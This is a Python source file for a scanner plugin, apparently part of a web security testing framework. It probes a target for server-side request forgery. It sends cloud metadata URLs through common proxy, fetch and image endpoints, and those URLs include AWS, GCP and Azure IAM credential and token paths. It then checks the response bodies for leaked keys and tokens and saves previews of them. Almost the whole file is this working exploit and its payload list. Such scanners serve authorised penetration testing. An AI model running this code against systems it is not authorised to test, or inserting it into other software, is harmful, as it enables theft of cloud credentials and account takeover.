from .base import BaseScanner
from .registry import register_scanner
from core.models import ScannerManifest, ScanTarget, FindingSeverity

CLOUD_METADATA_URLS = [
    # AWS
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/user-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin",
    "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info",
    "http://169.254.169.254/latest/dynamic/instance-identity/document",
    # GCP
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/",
    "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
    "http://metadata.google.internal/computeMetadata/v1/project/project-id",
    # Azure
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
    "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01",
    # Alibaba / OSS
    "http://100.100.100.200/latest/meta-data/",
    "http://100.100.100.200/latest/user-data/",
    "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
    # DigitalOcean
    "http://169.254.169.254/metadata/v1.json",
    # OpenStack
    "http://169.254.169.254/openstack/latest/meta_data.json",
    "http://169.254.169.254/openstack/latest/user_data",
]

GCP_HEADER = {"Metadata-Flavor": "Google"}
AZURE_HEADER = {"Metadata": "true"}


@register_scanner(manifest=ScannerManifest(
    name="cloud_metadata_scanner",
    category="exploit",
    risk_level="safe",
    estimated_cost=30,
    produces_tag_patterns=["cloud-metadata", "aws", "gcp", "azure", "ssrf-privesc"],
    produces_endpoint_types=[],
))
class CloudMetadataScanner(BaseScanner):
    name = "cloud_metadata_scanner"

    async def scan(self, target: ScanTarget) -> tuple[list, list]:
        findings = []
        endpoints = []
        client = await self.get_client()
        base = target.url.rstrip("/")

        ssrf_proxies = [
            base,
            f"{base}/proxy",
            f"{base}/api/proxy",
            f"{base}/fetch",
            f"{base}/api/fetch",
            f"{base}/image",
            f"{base}/api/image",
        ]

        for proxy_url in ssrf_proxies:
            for meta_url in CLOUD_METADATA_URLS:
                headers = {}
                if "google" in meta_url:
                    headers = GCP_HEADER
                elif "azure" in meta_url or "metadata/instance" in meta_url:
                    headers = AZURE_HEADER

                check_url = f"{proxy_url}?url={meta_url}" if "?" not in proxy_url else f"{proxy_url}&url={meta_url}"

                try:
                    resp = await client.get(check_url, headers=headers, follow_redirects=True, timeout=10)
                    self._stats["requests"] += 1

                    if resp.status_code == 200 and len((resp.text or "")) > 50:
                        body = resp.text or ""
                        is_aws = any(kw in body for kw in ["ami-id", "instance-id", "security-credentials", "AKIA"])
                        is_gcp = any(kw in body for kw in ["project", "zone", "service-accounts", "access_token"])
                        is_azure = any(kw in body for kw in ["subscriptionId", "tenantId", "resourceId"])
                        is_alibaba = any(kw in body for kw in ["region-id", "zone-id", "RamRole"])
                        is_digitalocean = any(kw in body for kw in ["droplet_id", "DigitalOcean"])

                        provider = "unknown"
                        if is_aws:
                            provider = "AWS"
                        elif is_gcp:
                            provider = "GCP"
                        elif is_azure:
                            provider = "Azure"
                        elif is_alibaba:
                            provider = "Alibaba"
                        elif is_digitalocean:
                            provider = "DigitalOcean"

                        if provider != "unknown":
                            ep = self.make_endpoint(url=check_url, status_code=200, discovered_by=self.name)
                            endpoints.append(ep)
                            findings.append(self.make_finding(
                                title=f"Cloud Metadata Exposed — {provider}",
                                description=f"Cloud metadata endpoint reached via {check_url}. Provider: {provider}. "
                                            f"Returned {len(body)} bytes of metadata.",
                                severity=FindingSeverity.CRITICAL.value,
                                endpoint=ep,
                                evidence={
                                    "proxy_url": proxy_url,
                                    "metadata_url": meta_url,
                                    "provider": provider,
                                    "body_preview": body[:300],
                                },
                                confidence=0.9,
                                tags=["cloud-metadata", provider.lower(), "ssrf", "privesc", "credential-exposure"],
                            ))
                except Exception:
                    self._stats["errors"] += 1

        return findings, endpoints
